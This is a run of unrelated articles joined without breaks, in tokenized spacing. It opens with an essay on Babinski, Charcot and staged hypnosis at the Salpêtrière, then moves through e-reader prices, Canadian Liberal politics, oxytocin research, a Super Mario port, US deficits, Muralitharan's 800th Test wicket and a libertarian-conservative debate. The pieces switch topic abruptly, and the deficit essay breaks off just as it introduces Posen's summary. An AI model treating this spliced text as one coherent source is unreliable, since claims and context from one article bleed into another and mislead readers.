Babinski had been Charcot ’s chef de clinique in 1885 - 1886 and had participated in a number of “ performances ” with hysterical women incarcerated at the Salpêtrière .
Most of them involved hypnosis in one form or another .
There is a famous 1887 painting ( “ Une leçon clinique à la Salpêtrière ” ) by André Brouillet — a copy of it hung in Freud ’s offices in Vienna and later directly over his psychoanalytic couch at Maresfield Gardens , London . [ 19 ]
Blanche Wittman , one of Charcot ’s patients , is shown fainting in Babinski ’s arms — several commentators have suggested that she appears to be in the throes of orgasm — while Charcot is lecturing to an enraptured all - male audience . [ 20 ]
A similar experiment at the Salpêtrière involving hypnosis and suggestion , and also “ starring ” Wittman , was described by another one of Charcot ’s students , the physician Gilles de la Tourette . [ 21 ]
Tourette hypnotized Blanche W. in front of colleagues and other people , including the playwright Jules Claretie , and then ordered her to commit a crime .
Tourette :
When you will be awake , you will poison Mr. G. . . .
Blanche W. : “ But why do you want me to poison Mr. G. ?
He has done nothing to me , he ’s a nice guy .
I want you to poison him . . .
I am not a criminal .
I have no poison , perhaps I could stab him with a knife or shoot him with a gun . . . ?
Tourette :
Here is a glass , I am pouring some beer and adding the poison .
Now , you need to have Mr. G. drink it . . .
Whatever happens , you will not remember , if questioned , that I told you to poison Mr. G .
Blanche W. : Alright , sir .
Then the patient was awakened by blowing air on her eyes .
She said hello to the assembled people , chatting with Claretie , before saying to Mr. G. : Blanche W. : My God !
It ’s really hot , are n’t you thirsty ?
I am dying of the heat .
You must be thirsty . . .
Here we are .
( Offering the glass with the imaginary poison . )
Please drink . . .
Mr. G. : Thank you , but I am not thirsty , however , I will agree to take it , but not without a kiss . . .
Blanche W. :
You are demanding , but . . .
Then Mr. G. drank from the glass and fell to the floor .
His body was carried out of the room .
Blanche W. was then questioned .
When asked whether she knew there was poison in the glass , she said there was none . [ 22 ] [ 23 ]
What are the doctors trying to demonstrate ? [ 24 ]
In Tourette ’s psycho - drama did Wittman know that she was committing a murder ?
Or were Tourette ’s instructions locked away in some dark corner of her brain , completely inaccessible ?
Was she faking it ?
Playing along , hoping to convince the doctors that she was doing their bidding , when she was doing nothing of the kind ? [ 25 ]
And what about Brouillet ’s painting ?
It has been endlessly reproduced , but what does it portray ?
Were the doctors creating a delusion for Wittman or for themselves ?
I keep thinking of Freud ’s patients supine on his rug - draped couch , staring up at a perverse spectacle of modern medicine .
Freud Museum , London
Charcot died of a sudden heart attack in 1893 .
Subsequently , his various theories of hysteria were attacked by his followers and eventually abandoned .
In 1901 Babinski put forth the idea of hysteria without organic causes , hysteria that was caused by “ auto - suggestion ” and could be cured by “ persuasion . ” [ 26 ]
For this condition , he coined yet another neologism : pithiatism — from the Greek words for persuasion and curable .
And in 1909 , Babinski published his coup de grâce , his paper on the “ dismemberment ” of hysteria .
All doctors now realize that the domain of traditional hysteria has been stretched beyond measure and that , at least , its supposed ability to duplicate the most diverse illnesses , “ to do everything , ” as it was formerly said , has been singularly exaggerated .
This is an established point ; but it interests me to investigate the grounds that gave rise to the former conception and the reasons that led to its abandonment .
In my opinion , hysteria ’s overextension has three principle causes : 1 ) diagnostic errors ; mistaking organic afflictions for hysterical ones ; 2 ) ignorance of the importance of deception , and classifying simulated phenomena as hysterical due to a lack of vigilance ; 3 ) conflating nervous states that should properly be distinguished from one another . [ 27 ]
Three principles .
One , diagnostic errors and three , errors of taxonomy ( of nosology ) .
But what about two ?
What if hysteria is unreal — the product of a willful mind , not bodily dysfunction — a performance , not a disease ?
I suppose the logical next question is whether it is a disorder at all .
Perhaps it simply embodies a different way of interacting with the world ?
The implications were unavoidable and quickly captured the imagination of the burgeoning Surrealists , who had strong connections to the evolving field of neurology .
André Breton , a leader of the Surrealist movement , had been an intern in neurology during the Great War ( at the hospital of St. Dizier ) and a student of Babinski .
Babinski , for his part , had inscribed a copy of his book “ Hysteria or Pithiatism ” to Breton , predicting that he would have a “ great medical future . ” [ 28 ]
L’Association Atelier André Breton
Property of the Bogousslavsky Foundation Library
By 1928 , Breton and fellow Surrealist Louis Aragon had written an encomium to Babinski .
Entitled “ The 50th Anniversary of Hysteria , ” it celebrated the end of hysteria as a diagnosis and was accompanied by four photographs of Augustine , one of Charcot ’s most famous patients who has since been called the “ pin- up girl ” of the Surrealists . [ 29 ]
Breton and Aragon quoted a 1913 monograph of Babinski ’s with great approval .
We surrealists insist on celebrating the 50th anniversary of hysteria , the greatest poetic discovery of the latter 19th century . . . M. Babinski , the most intelligent man who has tackled this question , dared to publish in 1913 the following : “ When an emotion is sincere and profound , and it stirs the human soul , there is no room for hysteria . ”
And in that we have the best so far that we have been given to learn . [ 30 ]
La Revolution Surrealiste , number 11
Clearly Breton was an admirer of Babinski ’s work , but it appears the influence might have been reciprocal .
“ Les Détraquées ” ( which could be translated as “ The Cranks ” or “ The Deranged Women ” ) , a 1921 play , was featured in Breton ’s novel “ Nadja . ” [ 31 ]
In the play , set at a private girls ’ boarding school , the lesbian headmistress and a dance instructor torture and murder a young student .
The authors were “ Palau ” and “ Olaf . ” Palau was a known actor and sometime author .
But who was Olaf ?
His identify was not revealed until 1956 ( in the first issue of Breton ’s magazine , Le Surrealisme , même ) .
Olaf was Babinski .
Babinski attended the premiere of “ Les Détraquées ” with a fake beard — using yet another alias , “ Alfred Binet . ” [ 32 ]
The critics hated it , but Breton was smitten , and despite his avowed antipathy to the theater , attended repeat performances .
I will no longer postpone expressing the unbounded admiration I felt for Les Détraquées , which remains and will long remain the only dramatic work . . . which I choose to recall .
L’Association Atelier André Breton
He included in “ Nadja ” a photograph of the actress who played Solange , the dance instructor ; a scene from the play ( with an inscription that reads : “ The child of a moment ago enters without a word . . . ” ) ; and a bizarre synopsis , culminating with :
. . . . The child ’s bloody corpse appears , head downward , and falls onto the floor .
The scream , the unforgettable scream .
I asked a friend of mine , Paul Jankowski , a professor of French history at Brandeis , to have a look at the text of the play .
I was afraid of the idiomatic French and wanted to make sure I was n’t missing anything .
Ironically , the play repeats many of the themes that characterize the “ performances ” at the Salpêtrière — the preoccupation with persuasion and crime , and the process of remembering and “ remembering nothing ” that seems to be a cornerstone of human experience .
But here the doctor - hero solves a crime rather than provokes one .
And women are preying on each other .
There is a curious detail , however .
The doctor clearly believes that Solange and the headmistress are acting under some other form of mental compulsion of which , he appears to suggest at the end , they are mostly unaware .
The doctor deduces instantly that the first girl found at the bottom of a well , supposedly a suicide , and the current victim who supposedly fled the premises , were in fact murdered by the directress and the dance instructor .
The inspector asks the doctor how they can now be so calm and untroubled after they had murdered someone only hours ago .
The doctor explains : “ Everyone poisons himself in his own way . . . anything is good to excite the nervous system . . . stronger and stronger sensations are needed . . . ” and hence on to sexual perversion and sadistic murder . . . that she ( the directress ) remembers nothing at this point , her crisis is over , and “ at least to the laymen , is as sane and inoffensive as you and me . . . ”
After the student is found strangled and covered with blood , he demands not prison for these two ladies but “ le cabanon , ” the solitary cell where dangerous lunatics were locked up in the past .
The last words are those of the inspector , “ But what ’s the difference ? ” Curtain .
In “ The Surrealist Manifesto , ” Breton writes ,
If in a cluster of grapes there are no two alike , why do you want me to describe this grape by the other , by all the others . . . ?
Our brains are dulled by the incurable mania of wanting to make the unknown known , classifiable . . .
It is pointless to add that experience itself has found itself increasingly circumscribed .
It paces back and forth in a cage from which it is more and more difficult to make it emerge . . .
Forbidden is any kind of search for truth that is not in conformance with accepted practices . . .
Both Babinski and the Surrealists shared a common concern — an obsession with consciousness , the nature of the ineffable and “ the incurable mania ” of trying to classify the unknown .
But in 1932 , the last year of his life , Babinski wrote an intriguing letter to his friend , the Portuguese physician Egas Moniz .
The letter is riddled with doubt — not just about interpreting experience , but also about the value of knowledge itself .
In the present circumstances , in the middle of so many tragic events , one may also wonder if science deserves to be the object of a cult .
The most admirable creations of the human mind , contrary to all expectations , have had as their main effect destruction and massacre ; with a bit of pessimism , one may curse advances in knowledge and fear that someday some discovery might have as a consequence the destruction of mankind . . . [ 33 ]
The letter ends on a somewhat more positive note but that need not concern us here .
I would like to provide one additional detail .
Babinski was called in to attend Marcel Proust , and was present when the prince of the subjective died in his cork - lined bedroom on Nov. 18 , 1922 .
The final scenes have been described in a number of biographies .
This account comes from William Carter .
It is Babinski who tells the truth to the family at the bitter end .
Inured to sentiment , focused on evidence , he was the only one present who was not in denial .
A short time later Robert [ Proust ’s brother , also a doctor ] sent for Drs. Bize and Babinski .
At approximately four o’clock , the three doctors conferred in the bedroom while Celeste listened , fearful that Proust heard everything .
Robert suggested an intravenous injection of camphor , but Babinski said : “ No , my dear Robert .
Do n’t make him suffer .
There is no point . ”
Then Bize left .
When Celeste showed Dr. Babinski to the door , she made a desperate plea : “ Professor , you are going to save him , are n’t you ? ” Babinski took her hands in his and looked into her eyes : “ Madame , I know all you have done for him .
You must be brave .
It is all over . ” [ 34 ]

In “ The Story of San Michele , ” Axel Munthe , a Swedish psychiatrist and contemporary of Charcot and Babinski , provides a devastating critique of these “ stage performances . ”
It is worth quoting at length .
“ To me who for years had been devoting my spare time to study hypnotism these stage performances of the Salpêtrière before the public of Tout Paris were nothing but an absurd farce , a hopeless muddle of truth and cheating .
Some of these subjects were no doubt real somnambulists faithfully carrying out in a waking state the various suggestions made to them during sleep — post - hypnotic suggestions .
Many of them were mere frauds , knowing quite well what they were expected to do , delighted to perform their various tricks in public , cheating both doctors and audience with the amazing cunning of the hystériques .
They were always ready to ‘ piquer une attaque ’ of Charcot ’s classical grande hystérie , arc - en - ciel and all , or to exhibit his famous three stages of hypnotism : lethargy , catalepsy , somnambulism , all invented by the Master and hardly ever observed outside the Salpêtrière .
Some of them smelt with delight a bottle of ammonia when told it was rose water , others would eat a piece of charcoal when presented to them as chocolate .
Another would crawl on all fours on the floor , barking furiously , when told she was a dog , flap her arms as if trying to fly when turned into a pigeon , lift her skirts with a shriek of terror when a glove was thrown at her feet with a suggestion of being a snake .
Another would walk with a top hat in her arms rocking it to and fro and kissing it tenderly when she was told it was her baby .
Hypnotized right and left , dozens of times a day , by doctors and students , many of these unfortunate girls spent their days in a state of semi-trance , their brains bewildered by all sorts of absurd suggestions , half conscious and certainly not responsible for their doings , sooner or later doomed to end their days in the salle des agités if not in a lunatic asylum . ”
( This description , which has never appeared in the French editions of “ The Story of San Michele , ” was the subject of some controversy .
Soon after it was published , Charcot ’s son went on the attack , claiming that Munthe had not in fact been the elder Charcot ’s student ( as Munthe had claimed ) .
Under pressure from Charcot ’s family , Munthe ’s translator omitted the chapter on the Salpêtrière from the initial French edition , and subsequent French editions remain incomplete .
If the reader finds himself compulsively interested in this issue , as I did , there is an excellent biography of Munthe , Bengt Jangfeldt , “ The Road to San Michele , ” p. 295 ff . )

A price war is brewing in the growing market for electronic reading devices .
Barnes & Noble , the national bookseller , announced Monday that it was dropping the price of its six - month - old Nook e-reader to $ 199 from $ 259 and introducing a new version of the device , which connects to the Internet only over Wi -Fi networks , for $ 149 .
Responding rapidly , Amazon.com then cut the price of its popular Kindle e-reader below the Nook , to $ 189 from $ 259 .
The price cuts were made as manufacturers of e-readers faced a mounting threat from Apple ’s iPad .
Even though it is far more expensive than the e-readers , the iPad , which starts at $ 500 , performs a range of functions with a versatile , colorful display that contrasts sharply with the static , monochrome screen of e-book readers .
Apple said it sold more than two million iPads in the two months since the tablet ’s introduction .
“ It was obvious that the price of stand - alone e-readers had to come down , ” said James McQuivey , an analyst at Forrester Research , citing the threat by Apple and other tablet makers .
“ We just never thought it was going to happen this rapidly . ”
OTTAWA
Some Liberals are n’t laughing at Jean Chrétien ’s barbed joke about a return from the political grave .
With another federal election fast approaching and Michael Ignatieff leading the party nowhere , panicking Liberals are looking everywhere except within themselves for a quick fix .
This week ’s caucus implosion over support for Conservative immigration change is one of many symptoms of a once dominant party in steep decline and startling disarray .
Ignatieff has lost his personal compass and seems physically exhausted .
Alf Apps , one of the supplicants who lured Ignatieff back from Harvard , is expected to step down soon from the presidency of a party failing to fill its campaign coffers .
Liberals in and out of Parliament are again searching for a messiah , or even an NDP coalition , to lead them from the wasteland back to power .
A measure of the madness here is the seriousness some backroom Liberals are lending to Chrétien ’s mischievous remark that he , like Britain ’s iconic William Gladstone , might return in old age for a fourth term .
Astonishingly , Chrétien ’s resurrection as interim leader continues to circulate here along with speculation about the NDP coalition the former Prime Minister is exploring .
Chrétien was arguably his generation ’s most shrewdly intuitive politician and at 76 is still impressively vigorous .
But retreating to the future would be as risky a Liberal solution as abandoning its brand .
A nostalgic Chrétien honeymoon would soon be cut short by nagging Conservative reminders of his Quebec sponsorship fling .
And Liberals seduced by the idea of uniting the political left are forgetting that that their party wins when it controls the policy centre Harper is shifting right .
That ’s not all Liberals are forgetting .
Their current agony is rooted in expedient leadership decisions that began with letting Paul Martin escape the necessary crucible of a testing campaign .
Forgotten , too , is that parties shooting inwards become wounded prey for outside predators .
One thing Liberals are noticing is that the problem is n’t staff around the leader ; it is the leader .
Dumping Ian Davey for Peter Donolo has n’t significantly improved Ignatieff ’s performance or provided a sustained opinion poll lift .
Liberals who saw in Ignatieff ’s public intellectual persona the potential to race up a steep political learning curve now see only a surprisingly empty vessel tossed by uncertainty .
They whisper that a summer equivalent of Pierre Trudeau ’s pre-resignation walk in the snow would improve party prospects and Ignatieff ’s mood .
But what then ?
Bob Rae might save seats Liberals now consider lost but the former Ontario NDP leader still faces fierce internal resistance .
Falling back on the old guard signals desperation and the next leadership generation is far from ready to move the party forward .
There ’s no sudden exit from this self - made labyrinth .
Fears are real that a listless , often loose - lipped Ignatieff may lead Liberals to disaster in a campaign already framed by Conservatives around Stephen Harper ’s leadership advantage and coalition warnings .
Even so , critical self - analysis and restored discipline can still make Liberals and Ignatieff the alternative democracy demands .
Public fury over summit security costs is all the hook needed to hang on Harper a history of wild spending that gnawed through an inherited $ 13 - billion surplus and set Canada en route for deficits long before the recession .
At the same time , Liberals need to climb off the coalition fence to clearly define who they are .
Ending the current panic begins with recognizing that Chrétien ’s return is a flat joke and that restoring the party is slow , hard , serious work .

Researchers at the University of Amsterdam provide first - time evidence for a neurobiological cause of intergroup conflict .
They show that oxytocin , a neuropeptide produced in the brain that functions as hormone and neurotransmitter , leads humans to self - sacrifice to benefit their own group and to show aggression against threatening out - groups .
This finding qualifies the wide - spread belief that oxytocin promotes general trust and benevolence .
Results were published in the journal Science .
An important qualification of this research is that oxytocin , commonly referred to as the " bonding hormone , " functions as a cause of defensive aggression -- aggression oriented towards neutralizing a threatening out - group .
When the competing out - group was not considered a threat , oxytocin only triggered altruism towards one 's own group .
This finding provides a neurobiological explanation for the fact that conflicts between groups escalates when other groups are seen as threatening .
When such threat is low , for example because there are ( physical ) barriers between the group territories , conflict escalation is less likely .
The evolution of altruism in intergroup conflict
The research team at the University of Amsterdam , directed by Dr. Carsten de Dreu , wondered why oxytocin would promote altruistic behavior .
Whereas classic economic theory has difficulty accounting for altruism , an evolutionary perspective suggests that altruism functions to strengthen one 's own group , from which the individual benefits in the long run .
Because aggression towards competing out - groups helps one 's own group to become relatively stronger , aggression is an indirect form of altruistic , loyal behavior towards one 's own group .
Charles Darwin already observed that groups whose members are altruistic towards the own group have a greater likelihood to prosper , to survive , and spread .
The researchers reasoned that if this is true , neurobiological mechanisms should have evolved that sustain altruism towards the own group , and aggression towards competing other groups .
The discovery that oxytocin promotes altruism towards the own group , and aggression towards threatening out - groups , supports this evolutionary perspective .
With Sonic the Hedgehog and Mario enjoying a comfortable friendship these days , a port of Super Mario Bros. to its 16 - bit rival console does n't seem that strange anymore .
What 's somewhat more surprising is how solid of a port it is .
Advertisement
It looks and almost sounds exactly like the NES original Super Mario Bros. , a game that has been ported to many platforms .
This port , created by Argentinian programmer " Mairtrus , " is probably faithful for a very good reason .
According to the Mairtrus , an automatic converter did much of the work , swapping one processor assembly language for another , leaving him with the chore of optimizing the game down to 64KB .
" At least the 75 % of the code is still untouched after the translation , " Mairtrus writes .

As you can see in this video , the original Super Mario Bros .
bugs are more faithfully translated than the blippy music .
Mairtrus says the Genesis port , named SMB4MD for Super Mario Bros. for Mega Drive , wo n't currently play on real Sega hardware , only in an emulator , an unfortunate oversight that may change .
That 's unlike some of these platform - jumping hack , like this shoddy Super Mario Bros. effort for the Genesis .
It does n't play like the original but borrows some of the graphics from Super Mario All - Stars for the SNES .
And nothing looks quite as bad as this Sonic the Hedgehog hack job for the NES .
Graphically pretty good , otherwise ... yeesh .
While Mairtrus ' port of Super Mario Bros. is n't perfect , it 's more than capable and gives us the opportunity to hear how bizarrely the Genesis ' sound chip interprets those classic Koji Kondo tunes .

" Physics is like sex : sure , it may give some practical results , but that 's not why we do it . "
If I had to pick a single scientist to eloquently sum up why we love science it would be Richard Feynman , a quantum - physicist Richard Feynman , who worked on the Manhattan Project , amongst other things .
Based on a Feynman quote found on reddit ; There 's a desktop here ( and below ) , and a poster for sale on etsy , if you like the design .
As several recent surveys make clear , concern about deficits and debt is rising sharply .
An NBC / Wall Street Journal survey conducted in early May showed that the share of individuals rating “ the deficit and government spending ” as the top priority for the federal government to address has jumped since January from 13 to 20 percent — second only to job creation and economic growth .
According to Gallup , “ federal government debt ” now ties with terrorism for the top spot in perceived threats to our future well - being .
It is entirely possible that we are reaching an inflection point in public attitudes that will force the political system to change course .
Indeed , as Janet Hook shows in a well - reported piece in Monday ’s Los Angeles Times , concerns about the deficit are already forcing congressional Democrats to scale back ambitious plans for continuing stimulus .
Hook quotes Mark Mellman , a pollster who has long worked with Democrats , as saying that “ there ’s no question that people are almost as concerned about the deficit and government spending as about jobs .
It is not just about the actual dollars — it is a metaphor for wasted money and lack of discipline and long - term economic decline . ”
A near - identical complex of concerns created an opening for a third - party presidential movement that garnered 19 percent of the vote in 1992 and strengthened the case for the policy of fiscal restraint Bill Clinton adopted in 1993 .
All of this raises the question of whether public sentiment coincides with sound economics .
A pretty good case can be made that it did in the 1990s , although it ’s also possible to argue that the U.S. economy got a special boost during that decade from information technology and the winding - down of the Cold War .
Today , many economists fear that we may be headed for a replay of Japan ’s “ lost decade ” of slow growth , which in our case would condemn us to historically high levels of long - term unemployment .
That raises another question :
What can the United States learn from the Japanese experience that should shape our own policy choices during this decade ?
This is more than an academic question , and the discussion cannot be confined to professional economists .
After all , how to deal effectively with the twin challenges of economic growth and fiscal sustainability will be this decade ’s dominant domestic policy debate .
It was in that context that I waded ( some would say blundered ) into a public colloquy with Paul Krugman and his legions of supporters .
In the process , I discovered that Japan ’s lost decade is surprisingly difficult to decode and that much of the data does n’t mean what it appears to .
Because Adam Posen of the Peterson Institute for International Economics seems to be the generally acknowledged guru of Japanese economics studies , I turned to a lecture he delivered at LSE last month .
Posen argues that when the Japanese employed traditional Keynesian stimulus , it worked in the ways that conventional theory would predict and that the recovery faltered when the government unwisely pulled back from stimulative policies .
( In that respect , Japanese policies in the late 1990s were akin to FDR ’s turn toward restraint after 1936 , which halted the recovery and renewed the decline . )
Posen sums up as follows :

Muttiah Muralitharan became the first bowler to take 800 Test wickets on the final day of his Test career in Galle .
The Sri Lanka off - spinner , 38 , who made his Test debut in 1992 , began his final match against India on 792 wickets .
He ousted record Test run-scorer Sachin Tendulkar on Tuesday and went on to take 5 - 63 as India had to follow on .
Team - mate Lasith Malinga took 5 - 50 but with the last pair together , Murali had last man Pragyan Ojha caught by Mahela Jayawardene at slip to reach his 800 .
It left Sri Lanka needing to score 95 to win the match and take a 1 - 0 lead in the series , which their openers did with little fuss , but Muralitharan 's achievement - reached in his 133rd Test - will overshadow the game .

Needing three wickets in the second innings to reach the magic 800 mark , he removed Yuvraj Singh with the last ball of the fourth day , and trapped fellow off - spinner Harbhajan Singh lbw early on day five .
With paceman Malinga liable to blast the Indian tail away at any time , Murali had to wait for his moment - having lbw and stumping appeals turned down , while seeing VVS Laxman , India 's last recognised batsman , run out off his bowling .
Last pair Ojha and Ishant Sharma resisted for 15 overs , but the safe hands of Jayawardene , one of the most reliable slip fielders of the modern era , fell to his left and pouched his 157th Test catch to begin the Sri Lankan celebrations .
" Galle is my favourite ground and this is the opportunity I was waiting for to win the match and finish it nicely , " said Muralitharan after finishing with match figures of 8 -191 .
" In my mind it was not the 800 running in to bowl .
Running in I was thinking ' we have to win the match ' .
" Galle can be sometimes unpredictable and it can rain .
A draw would have been a sad result .
" But today it was evening up , especially the magnificent bowling by Malinga .
Nobody could bowl like that in the world .
He made the difference . "
Among the first of many former and current players to congratulate Muralitharan was his former rival Shane Warne , who admitted : " I do n't think anyone will get there , so well done to Murali for getting his 800 .
" The way he 's gone about it has been amazing . "
Earlier in July , the BBC Sinhala Service revealed Muralitharan 's retirement plans - and he later confirmed that this Test in Galle , the first of a three - game series , would be his last .
He is expected to continue to play limited - overs internationals , including next spring 's World Cup which will be staged in Sri Lanka , India and Bangladesh .
606 : THE MURALITHARAN DEBATE Muttiah Muralitharan is cricket 's equivalent to Marmite
BBC Sport's Pranav Soneji
Born in Kandy , Muralitharan has also taken 515 wickets in 337 one - day internationals , and a further 13 in Twenty20 internationals .
His unique bent - arm bowling action , caused by a deformity from birth , has meant that he has courted controversy at times during his career .
Some umpires and former players have questioned his action 's legality - notably in Australia , where umpires Darrell Hair and Ross Emerson no -balled him for throwing , and former prime minister John Howard once called him a " chucker " , although he later apologised .
The mechanics of his bowling action have been investigated and cleared on more than one occasion by the International Cricket Council , although in 2005 the ICC amended its rules to allow bowlers to straighten their arms by up to 15 degrees .
MURALI 'S 800 TEST WICKETS 112 v England ( in 16 Tests ) 105 v India ( in 22 ) 104 v South Africa ( in 15 ) 89 v Bangladesh ( in 11 ) 87 v Zimbabwe ( in 14 ) 82 v New Zealand ( in 14 ) 82 v West Indies ( in 12 ) 80 v Pakistan ( in 16 ) 59 * v Australia ( in 13 ) * includes 5 for ICC World XI in 2005
Throughout most of his Test career , he battled Australia leg - spinner Shane Warne for the title of Test cricket 's leading wicket - taker , and the Sri Lankan took top spot ahead of Courtney Walsh and Warne in May 2004 with his 520th wicket , before an enforced spell on the sidelines after having shoulder surgery allowed Warne to forge ahead .
But after Warne 's international retirement , Muralitharan reclaimed the crown on his home ground in Kandy in December 2007 by bowling England 's Paul Collingwood for his 709th wicket .
Away from the international game , he has had spells with English counties Kent and Lancashire , and also starred for Chennai Super Kings in the lucrative Indian Premier League - taking 1 - 17 from his four overs as Chennai won this year 's IPL final .
Speaking before the Test , he explained that his decision to quit five - day cricket was because of the wear and tear on his body .
" I 've played for 19 years , I 'm getting tired and getting old , " he told the BBC .
" There are a lot of good spinners waiting for their chance , and hopefully they can become like me one day . "

For those who cherish the ideals of free minds and free markets , 21st century politics in the United States has not been a particularly welcoming place .
The big - government conservatism of George W. Bush has been followed by the bigger - government liberalism of Barack Obama .
The twin crises of 9/11 and the 2008 financial meltdown spawned the twin leviathans of national security hyperextension and the never - ending bailout .
The nation 's political class has rallied around the economic ideas of John Maynard Keynes , and the country 's short - term financial picture only looks tenable when compared to the long - term fiscal nightmare that just about everyone agrees is coming .
So where should libertarians drop anchor and forge alliances within the famous four - sided Nolan Chart spectrum of political beliefs and groupings ?
In this exchange , Contributing Editor Brink Lindsey argues that it 's time , once and for all , to sever the libertarian - conservative alliance that dates back to the New Deal while remaining skeptical about the illiberal populism of Tea Party activism .
In response , a conservative writer — National Review Online Editor - at - Large Jonah Goldberg — disputes Lindsey 's portrayal of the right and contends that the only major party giving free market economics the time of day is the GOP .
Meanwhile , FreedomWorks President Matt Kibbe tells Lindsey and his think tank fellow travelers to climb down off that high horse and celebrate the most promising limited - government popular uprising in generations .
Right Is Wrong
Libertarians need to disengage from Republicans and conservatives once and for all .
By Brink Lindsey
By the waning years of the Bush administration , the old " fusionist " alliance between libertarians and social conservatives seemed to be on its last legs .
After the inglorious collapse of Social Security reform , the political agenda of the right was more or less free of any contamination by libertarian ideas .
The GOP sank into ruling - party decadence marked by borrow - and - spend fiscal incontinence and K Street Project cronyism .
The broader conservative movement , meanwhile , expended its energy on gay - bashing , anti-immigrant hysteria , fantasies of World War IV , meddling in the Schiavo family tragedy , and redefining patriotism as enthusiasm for mass surveillance and torture .
Now , however , opposition to Barack Obama and the Democratic Congress has sparked a resurgence of libertarian rhetoric on the right , most prominently in the " Tea Party " protests that have erupted over the past year .
" Libertarian sentiment has finally gone mainstream , " wrote Chris Stirewalt , political editor of the conservative Washington Examiner , in a column this April .
" After two wars , a $ 12 trillion debt , a financial crisis and the most politically tone - deaf president in modern history , Americans may have finally given up on big government . "
Such talk gets many libertarians excited .
Could a revival of small - government conservatism really be at hand ?
After the long apostasy of Bush père et fils , could the right really be returning to the old - time religion of Goldwater and Reagan ?
Could the withered fusionist alliance of libertarians and conservatives channel today 's popular disgust with statist excess into revitalized momentum for limited - government reform ?
In a word , no .
Without a doubt , libertarians should be happy that the Democrats ' power grabs have met with such vociferous opposition .
Anything that can stop this dash toward dirigisme , or at least slow it down , is a good thing .
Seldom has there been a better time to stand athwart history and yell " Stop ! "
So we should rejoice that at least some conservatives have n't forgotten their signature move .
That , however , is about all the contemporary right is good for .
It is capable of checking at least some of the left 's excesses , and thank goodness for that .
But a clear - eyed look at conservatism as a whole reveals a political movement with no realistic potential for advancing individual freedom .
The contemporary right is so deeply under the sway of its most illiberal impulses that they now define what it means to be a conservative .
What are those impulses ?
First and foremost , a raving , anti-intellectual populism , as expressed by ( among many , many others ) Sarah Palin and Glenn Beck .
Next , a brutish nationalism , as expressed in anti-immigrant xenophobia ( most recently on display in Arizona ) and it 's - always - 1938 - somewhere jingoism .
And , less obvious now but always lurking in the background , a dogmatic religiosity , as expressed in homophobia , creationism , and extremism on beginning - and end - of - life issues .
The combined result is a right - wing identity politics that feeds on the red meat of us versus them , " Real America " versus the liberal - dominated coasts , faith and gut instinct versus pointy - headed elitism .
This noxious stew of reaction and ressentiment is the antithesis of libertarianism .
The spirit of freedom is cosmopolitan .
It is committed to secularism in political discourse , whatever religious views people might hold privately .
And it coolly upholds reason against the swirl of interests and passions .
History is full of ironies and surprises , but there is no rational basis for expecting an outlook as benighted as the contemporary right 's to produce policy results that libertarians can cheer about .
Groupthink and Fever Dreams
Modern conservatism has always had an illiberal dark side .
Recall the first great populist spasms of the postwar right —
McCarthyism and opposition to desegregation — and recall as well that National Review founder William F. Buckley stoutly defended both .
Any ideology dedicated to defending traditional ways of doing things is of necessity going to appeal to the reactionary as well as the prudently conservative .
And since , going all the way back to Buckley 's God and Man at Yale , the right 's adversary was the nation 's liberal intellectual elite , conservatism has always been vulnerable to the populist temptation .
But prior to the rise of the conservative counter - establishment — think tanks , talk radio , websites , and Fox News — the right 's dark side was subject to a critical constraint :
To be visible at all in the nation 's public debate , conservatism was forced to rely on intellectual champions whose sheer brilliance and sophistication caused the liberal gatekeepers in mass media to deem them suitable for polite company .
People such as Buckley , George Will , and Milton Friedman thus became the public face of conservative ideology , while the rabble - rousers and conspiracy theorists were consigned to the shadow world of mimeographs , pamphlets , and paperbacks that nobody ever reviewed .
The handicap of elite hostility thereby conferred an unintended benefit :
It gave conservatism a high - quality intellectual leadership that , to some extent at least , was able to curb the movement 's baser instincts .
Now , however , the discipline of having to fight intellectual battles on the opponent 's turf is long gone .
Conservatism has turned inward , like the dog in the joke , because it can .
The result is what reason Contributing Editor Julian Sanchez has called the movement 's " epistemic closure . "
The quality of the right 's intellectual leadership — the people who set the agenda , who define what " true " conservatism means at any given time — has consequently suffered a precipitous decline .
What counts today is n't engaging the other side with reasoned arguments ; it 's building a rabid fan base by demonizing the other side and stoking the audience 's collective sense of outrage and victimization .
And that 's a job best performed not by serious thinkers but by hacks and hucksters .
Rush Limbaugh , Glenn Beck , Sean Hannity , Mark Levin , Joseph Farah , Ann Coulter , Michelle Malkin : they adorn the cathedral of conservatism like so many gargoyles .
Yes , there are still many bright and inquisitive minds on the right , but they are not the movement 's stars and they do n't call the shots .
On the contrary , if they stray too far in challenging the conservative id , they find themselves cast out and castigated as heretics and RINOs ( Republicans In Name Only ) .
Bruce Bartlett and David Frum ( who are friends of mine ) are only two of the more prominent victims of that intolerant groupthink ; both were sacked by conservative think tanks shortly after loudly expressing heterodox opinions .
As the worst get on top , they bring out the worst in their loyal followers .
Goaded by the conservative message machine 's toxic mix of intolerance and self - pity , mass opinion on the right has veered off into feverish self - delusion .
Witness the " birther " phenomenon .
According to Public Policy Polling , 63 percent of Republicans either believe Obama was born in a foreign country or are n't sure one way or the other .
A more recent poll by the same outfit shows that 52 percent of Republicans believe that ACORN stole the 2008 election for Obama with voter fraud , while another 21 percent are undecided .
This polling outfit is closely tied to the Democrats , so take the exact numbers with some grains of salt if you wish .
But it is beyond doubt that paranoia is rampant in right - wing circles these days .
The return of small - government rhetoric does not signal a break from the right 's illiberal commitments .
Rather , those same commitments are simply being expressed in a different way to suit the changing times .
We 're in the midst of a deep slump , and economic issues always come to the fore during tough times .
Furthermore , Washington is now under Democratic control .
When their own gang was in power , conservatives rallied " us " against a grab bag of " thems , " most notably gays , Mexicans , and " Islamofascists " and their liberal " appeasers . "
Now the us-versus - them game has gotten much simpler .
Barack Obama — Harvard - educated , left of center , the son of a foreigner , a suspected Muslim who ( according to Palin ) " pals around with terrorists " — pulls together all the hated " thems " in one convenient package .
Opposing Obama and his agenda may sound libertarian , but it's also the perfect outlet for the same old distinctly anti-libertarian mix of populism , nationalism , and dogmatism .
Let 's look in particular at the Tea Party movement , whose sudden rise is what has sparked all the talk of a fusionist revival .
In April The New York Times published a detailed survey of Tea Party supporters , and the results are telling .
First , this movement is definitely a right - wing phenomenon .
Of those polled , 73 percent said they are somewhat or very conservative , 54 percent called themselves Republicans ( compared to only 5 percent who confessed being Democrats ) , and 66 percent said they always or usually vote for the GOP candidate .
When asked to give their opinions of various public figures , they gave favorable / unfavorable splits of 59/6 for Glenn Beck and 66 / 12 for Sarah Palin ( though a plurality said the latter would not be an effective president ) .
